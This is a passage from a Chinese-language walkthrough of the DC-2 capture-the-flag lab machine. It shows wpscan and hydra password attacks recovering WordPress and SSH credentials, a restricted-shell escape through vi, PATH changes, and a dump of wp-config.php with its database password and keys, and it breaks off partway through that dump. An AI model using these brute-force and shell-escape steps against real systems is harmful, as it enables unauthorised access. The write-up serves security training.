+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ wpscan --url http://dc-2 -U user -P passwdlist <br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` |  _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]<br>[+] URL: http://dc-2/ [192.168.56.124]<br>[+] Started: Sun Jul  9 10:17:34 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entry: Server: Apache/2.4.10 (Debian)<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://dc-2/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br> |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyseventeen<br> | Location: http://dc-2/wp-content/themes/twentyseventeen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.2<br> | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.2 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: <span class="hljs-string">&#x27;Version: 1.2&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[+] Enumerating Config Backups (via Passive and Aggressive Methods)<br> Checking Config Backups - Time: 00:00:00 &lt;=====================================&gt; (137 / 137) 100.00% Time: 00:00:00<br><br>[i] No Config Backups Found.<br><br>[+] Performing password attack on Xmlrpc against 3 user/s<br>Trying admin / CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/) Time: 00:00:00 &lt;&gt; (0 / 3585[SUCCESS] - jerry / adipiscing                                                                                      <br>[SUCCESS] - tom / parturient                                                                                        <br>Trying admin / nascetur Time: 00:02:38 &lt;===============                        &gt; (1605 / 3995) 40.17%  ETA: ??:??:??<br><br>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient<br><br>[!] No WPScan API Token given, as a result vulnerability data has not been output.<br>[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register<br><br>[+] Finished: Sun Jul  9 10:20:17 2023<br>[+] Requests Done: 1746<br>[+] Cached Requests: 37<br>[+] Data Sent: 836.025 KB<br>[+] Data Received: 992.351 KB<br>[+] Memory used: 253.152 MB<br>[+] Elapsed time: 00:02:42<br></code></pre></td></tr></table></figure>
+
+<p>找到了两个正确的用户名和密码，进入 wordpress 后台的同时，尝试 ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ hydra -L sshuser -P sshpassswd 192.168.56.124 ssh -s 7744<br>Hydra v9.4 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-09 11:40:34<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task<br>[DATA] attacking ssh://192.168.56.124:7744/<br>[7744][ssh] host: 192.168.56.124   login: tom   password: parturient<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-09 11:40:37<br></code></pre></td></tr></table></figure>
+
+<p>发现 tom 的账户可以用来 ssh 登录，而 wordpress 后台中，第二个 flag 藏在了 jerry 登录才能看到的 post 中</p>
+<p><img src="/pic/198ad5635aa7680e3c55ae4350145cce_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个用户并不是 admin，插件也没法上传，后台是没法上传 shell 了，不过已经拿到了 ssh 登录的用户密码，也就无所谓了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ ssh tom@192.168.56.124 -p 7744<br>tom@192.168.56.124\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sun Jul  9 11:47:06 2023 from 192.168.56.106</span><br><span class="hljs-string">tom@DC-2:~$ whami</span><br><span class="hljs-string">-rbash: whami: command not found</span><br><span class="hljs-string">tom@DC-2:~$ </span><br></code></pre></td></tr></table></figure>
+
+<h2 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h2><p>不太清楚 rbash 是什么，搜索一下</p>
+<p><a target="_blank" rel="noopener" href="https://www.linuxfordevices.com/tutorials/linux/rbash-in-linux">The rbash in Linux - Understanding Restricted Bash - LinuxForDevices</a></p>
+<p>简单归纳一下，实际上 rbash 是出于安全的考虑对用户可以使用的命令进行限制，尝试了几个命令，发现 cd, whoami 等被禁止了，ls 没有被禁止尝试用 ls 进行目录的读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:~$ <span class="hljs-built_in">ls</span><br>flag3.txt  usr<br>tom@DC-2:~$ <span class="hljs-built_in">ls</span> ./usr<br>bin<br>tom@DC-2:~$ <span class="hljs-built_in">ls</span> ./usr/bin<br>less  <span class="hljs-built_in">ls</span>  scp  vi<br></code></pre></td></tr></table></figure>
+
+<p>当前路径下有四个文件，应该是对应了用户可以使用的四个命令，尝试搜索一下 <code>rbash escape</code> 和 <code>rbash bypass</code></p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf">44592-linux-restricted-shell-bypass-guide.pdf (exploit-db.com)</a> exoloit-db 中的这个 pdf 给了许多绕过的方法和思路，看了一下本质上是使用现有命令新启一个 bash，那我们可以借助于 gtfobins 中开启 shell 的方法</p>
+<p>尝试了几个，less 的新启 shell 的方法都有点问题</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:~$ VISUAL=<span class="hljs-string">&quot;/bin/sh -c &#x27;/bin/sh&#x27;&quot;</span> less /etc/profile<br>/bin/rbash: /bin/sh: restricted: cannot specify `/<span class="hljs-string">&#x27; in command names</span><br><span class="hljs-string">/bin/rbash: /bin/sh: restricted: cannot specify `/&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">command</span> names<br><br></code></pre></td></tr></table></figure>
+
+<p>我选择了使用 vi</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi<br>:<span class="hljs-built_in">set</span> shell=/bin/sh<br>:shell<br></code></pre></td></tr></table></figure>
+
+<p>再就是这里如果 <code>set shell=/bin/bash</code>，仍然无法 bypass，以下是错误记录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br><br>[1]+  Stopped                 vi<br>tom@DC-2:~$ <span class="hljs-built_in">whoami</span><br>-rbash: <span class="hljs-built_in">whoami</span>: <span class="hljs-built_in">command</span> not found<br><br></code></pre></td></tr></table></figure>
+
+<p>使用 less 读取 flag3.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Poor old Tom is always running after Jerry. Perhaps he should su <span class="hljs-keyword">for</span> all the stress he causes.<br></code></pre></td></tr></table></figure>
+
+<p>还是无法使用 cat,whoami 等命令，看一眼环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/home/tom/usr/bin<br></code></pre></td></tr></table></figure>
+
+<p>看来是因为环境变量里没有常用的程序的路径，一开始我也没想到看环境变量，我是使用绝对路径调用 python 反弹 shell 后发现 shll 依然有很多命令找不到，而在后续翻看文件夹的时候，发现 <code>/usr/bin</code> 里是有常用的程序的。那接下来可以把常用的一些路径放入环境变量中，我看了看 kali 中的环境变量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/dc_2]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>                                          <br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games<br></code></pre></td></tr></table></figure>
+
+<p>按照 kali 中的环境变量将其写入靶机的环境变量中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:<span class="hljs-variable">$PATH</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/tom/usr/bin<br></code></pre></td></tr></table></figure>
+
+<p>折腾了半天总算把 shell 完善了。尝试 <code>sudo -l</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo -l                           <br>[sudo] password <span class="hljs-keyword">for</span> tom:                                                                                            <br>Sorry, user tom may not run sudo on DC-2.<br></code></pre></td></tr></table></figure>
+
+<h2 id="信息收集与用户切换"><a href="#信息收集与用户切换" class="headerlink" title="信息收集与用户切换"></a>信息收集与用户切换</h2><p>没有权限，进入 home 目录发现还有个 jerry 用户，感觉像是在玩猫和老鼠的梗，除此之外如果仔细翻看登录后的 wordpress 后台的话，可以在用户信息里看到用户的全程就是 <code>tom cat</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /home/jerry<br>$ <span class="hljs-built_in">ls</span> -liah<br>total 28K<br>128057 drwxr-xr-x 2 jerry jerry 4.0K Mar 21  2019 .<br>  1558 drwxr-xr-x 4 root  root  4.0K Mar 21  2019 ..<br>140336 -rw------- 1 jerry jerry  270 Jul 10 04:47 .bash_history<br>128060 -rw-r--r-- 1 jerry jerry  220 Mar 21  2019 .bash_logout<br>128058 -rw-r--r-- 1 jerry jerry 3.5K Mar 21  2019 .bashrc<br>140348 -rw-r--r-- 1 jerry jerry  223 Mar 21  2019 flag4.txt<br>128059 -rw-r--r-- 1 jerry jerry  675 Mar 21  2019 .profile<br>$ <span class="hljs-built_in">cat</span> flag4.txt<br>Good to see that you<span class="hljs-string">&#x27;ve made it this far - but you&#x27;</span>re not home yet. <br><br>You still need to get the final flag (the only flag that really counts!!!).  <br><br>No hints here - you<span class="hljs-string">&#x27;re on your own now.  :-)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Go on - git outta here!!!!</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>不是很能理解暗示的言外之意，一方面说没有暗示，一方面最后一句又显得很奇怪。wordpress 后台的话，应该能在 config 文件里找到数据库的密码，考虑密码碰撞或者数据库信息泄露或者 mysql 提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> /var/www/html<br>$ <span class="hljs-built_in">ls</span> -liah<br>total 200K<br>27872 drwxr-xr-x  5 1006 1006 4.0K Mar 21  2019 .<br>26852 drwxr-xr-x  4 root root 4.0K Mar 21  2019 ..<br>32857 -rw-r--r--  1 1006 1006  418 Sep 24  2013 index.php<br>32860 -rw-r--r--  1 1006 1006  20K Jan 23  2018 license.txt<br>32859 -rw-r--r--  1 1006 1006 7.3K Oct 31  2017 readme.html<br>32861 -rw-r--r--  1 1006 1006 5.4K Sep 27  2016 wp-activate.php<br>28084 drwxr-xr-x  9 1006 1006 4.0K Apr  4  2018 wp-admin<br>32867 -rw-r--r--  1 1006 1006  364 Dec 19  2015 wp-blog-header.php<br>32856 -rw-r--r--  1 1006 1006 1.6K Aug 29  2016 wp-comments-post.php<br>33614 -rw-r--r--  1 root root 3.2K Mar 21  2019 wp-config.php<br>32862 -rw-r--r--  1 1006 1006 2.8K Dec 16  2015 wp-config-sample.php<br>32863 drwxr-xr-x  5 1006 1006 4.0K Apr  4  2018 wp-content<br>27915 -rw-r--r--  1 1006 1006 3.3K May 24  2015 wp-cron.php<br>32868 drwxr-xr-x 18 1006 1006  12K Apr  4  2018 wp-includes<br>33613 -rw-r--r--  1 1006 1006 2.4K Nov 20  2016 wp-links-opml.php<br>28080 -rw-r--r--  1 1006 1006 3.3K Oct 24  2016 wp-load.php<br>27914 -rw-r--r--  1 1006 1006  34K Apr  3  2018 wp-login.php<br>32866 -rw-r--r--  1 1006 1006 7.9K Jan 11  2017 wp-mail.php<br>32865 -rw-r--r--  1 1006 1006  16K Apr  6  2017 wp-settings.php<br>33612 -rw-r--r--  1 1006 1006  30K Oct 19  2016 wp-signup.php<br>32858 -rw-r--r--  1 1006 1006 4.5K Oct 14  2016 wp-trackback.php<br>28008 -rw-r--r--  1 1006 1006 3.0K Aug 31  2016 xmlrpc.php<br></code></pre></td></tr></table></figure>
+
+<p>确实有 wp-config 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> wp-config.php<br>&lt;?php<br>define(<span class="hljs-string">&#x27;WP_HOME&#x27;</span>,<span class="hljs-string">&#x27;http://dc-2&#x27;</span>);<br>define(<span class="hljs-string">&#x27;WP_SITEURL&#x27;</span>,<span class="hljs-string">&#x27;http://dc-2&#x27;</span>);<br><br>/**<br> * The base configuration <span class="hljs-keyword">for</span> WordPress<br> *<br> * The wp-config.php creation script uses this file during the<br> * installation. You don<span class="hljs-string">&#x27;t have to use the web site, you can</span><br><span class="hljs-string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * This file contains the following configurations:</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * * MySQL settings</span><br><span class="hljs-string"> * * Secret keys</span><br><span class="hljs-string"> * * Database table prefix</span><br><span class="hljs-string"> * * ABSPATH</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span><br><span class="hljs-string"> *</span><br><span class="hljs-string"> * @package WordPress</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="hljs-string">/** The name of the database for WordPress */</span><br><span class="hljs-string">define(&#x27;</span>DB_NAME<span class="hljs-string">&#x27;, &#x27;</span>wordpressdb<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database username */</span><br><span class="hljs-string">define(&#x27;</span>DB_USER<span class="hljs-string">&#x27;, &#x27;</span>wpadmin<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL database password */</span><br><span class="hljs-string">define(&#x27;</span>DB_PASSWORD<span class="hljs-string">&#x27;, &#x27;</span>4uTiLL<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** MySQL hostname */</span><br><span class="hljs-string">define(&#x27;</span>DB_HOST<span class="hljs-string">&#x27;, &#x27;</span>localhost<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Database Charset to use in creating database tables. */</span><br><span class="hljs-string">define(&#x27;</span>DB_CHARSET<span class="hljs-string">&#x27;, &#x27;</span>utf8<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** The Database Collate type. Don&#x27;</span>t change this <span class="hljs-keyword">if</span> <span class="hljs-keyword">in</span> doubt. */<br>define(<span class="hljs-string">&#x27;DB_COLLATE&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br>/**<span class="hljs-comment">#@+</span><br> * Authentication Unique Keys and Salts.<br> *<br> * Change these to different unique phrases!<br> * You can generate these using the &#123;@<span class="hljs-built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;<br> * You can change these at any point <span class="hljs-keyword">in</span> time to invalidate all existing cookies. This will force all <span class="hljs-built_in">users</span> to have to <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> again.<br> *<br> * @since 2.6.0<br> */<br><br>define(<span class="hljs-string">&#x27;AUTH_KEY&#x27;</span>,         <span class="hljs-string">&#x27;,dl5^nwxT:/et,y6K$f=q+X|nk47g=@spk&lt;w?-&gt;-DsKODlCXNmNtmH]gA&#123;xoBl%x&#x27;</span>);<br>define(<span class="hljs-string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="hljs-string">&#x27;!]B|&amp;_X _&#123;|rp 5fY6UU+fU$I6b!kvKa&#123;r3S|xs.]:WWm&gt;:&#123;,?M`qq8TwKZmx T|&#x27;</span>);<br>define(<span class="hljs-string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="hljs-string">&#x27;a5:jar&#123;YEiPSA&#123;sq[4KO-|OZk=Sp^f+3&#125;8bZ5zAb0skMj)CAC1W&#125;SH&#125;vx(nU2NX]&#x27;</span>);<br>define(<span class="hljs-string">&#x27;NONCE_KEY&#x27;</span>,        <span class="hljs-string">&#x27;7PhZ~$,c$xng&#123;U|Kv`-%R?&gt;T+9,|M_h!dXY&#125;yk;|:ZX|;M:ZL|DDoUR[n)h4|NY%&#x27;</span>);<br>define(<span class="hljs-string">&#x27;AUTH_SALT&#x27;</span>,        <span class="hljs-string">&#x27;(&#123;(&lt;.wWSJmt|&lt;OY@%tg(!kwk4]1U.%&lt;wL+zA0F]ZQn|IHs%W&gt;`Fu-FtJ~j;Fb&gt;Zz&#x27;</span>);<br>define(<span class="hljs-string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="hljs-string">&#x27;@(xD@ W~&gt;EH7Pd^i!9(-V1)%@P[6=WQ0s6SP,otK.rKE4WWhF)?DK0wM1LOR#E|x&#x27;</span>);<br>define(<span class="hljs-string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="hljs-string">&#x27;H@?@Gqd&gt;Cfuhbr2&gt;U4RNoVpA3&#123;+~_`o@b,2s)uwl*|MG GB^2tx~Vrc^w60Rv`h(&#x27;</span>);<br>define(<span class="hljs-string">&#x27;NONCE_SALT&#x27;</span>,       <span class="hljs-string">&#x27;x~|2pyiJ^j!L=dBM&lt;S$|U/)pE1HN|&#123;o,Yu-~[NT_VaEI7Go5uNaqNzBs1aA063a%&#x27;</span>);<br><br><br>/**<span class="hljs-comment">#@-*/</span><br><br>/**<br> * WordPress Database Table prefix.<br> *<br> * You can have multiple installations <span class="hljs-keyword">in</span> one database <span class="hljs-keyword">if</span> you give each<br> * a unique prefix. Only numbers, letters, and underscores please!<br> */<br><span class="hljs-variable">$table_prefix</span>  = <span class="hljs-string">&#x27;wp_&#x27;</span>;<br><br>/**<br> * For developers: WordPress debugging mode.<br> *<br> * Change this to <span class="hljs-literal">true</span> to <span class="hljs-built_in">enable</span> the display of notices during development.<br> * It is strongly recommended that plugin and theme developers use WP_DEBUG<br> * <span class="hljs-keyword">in</span> their development environments.<br> *<br> * For information on other constants that can be used <span class="hljs-keyword">for</span> debugging,<br> * visit the Codex.<br> *<br> * @<span class="hljs-built_in">link</span> https://codex.wordpress.org/Debugging_in_WordPress<br> */<br>define(<span class="hljs-string">&#x27;WP_DEBUG&#x27;</span>, <span class="hljs-literal">false</span>);<br><br>/* That\<span class="hljs-string">&#x27;s all, stop editing! Happy blogging. */</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Absolute path to the WordPress directory. */</span><br><span class="hljs-string">if ( !defined(&#x27;</span>ABSPATH<span class="hljs-string">&#x27;) )</span><br><span class="hljs-string">        define(&#x27;</span>ABSPATH<span class="hljs-string">&#x27;, dirname(__FILE__) . &#x27;</span>/<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/** Sets up WordPress vars and included files. */</span><br><span class="hljs-string">require_once(ABSPATH . &#x27;</span>wp-settings.php<span class="hljs-string">&#x27;);</span><br><span class="hljs-string">define( &#x27;</span>WP_AUTO_UPDATE_CORE<span class="hljs-string">&#x27;, false 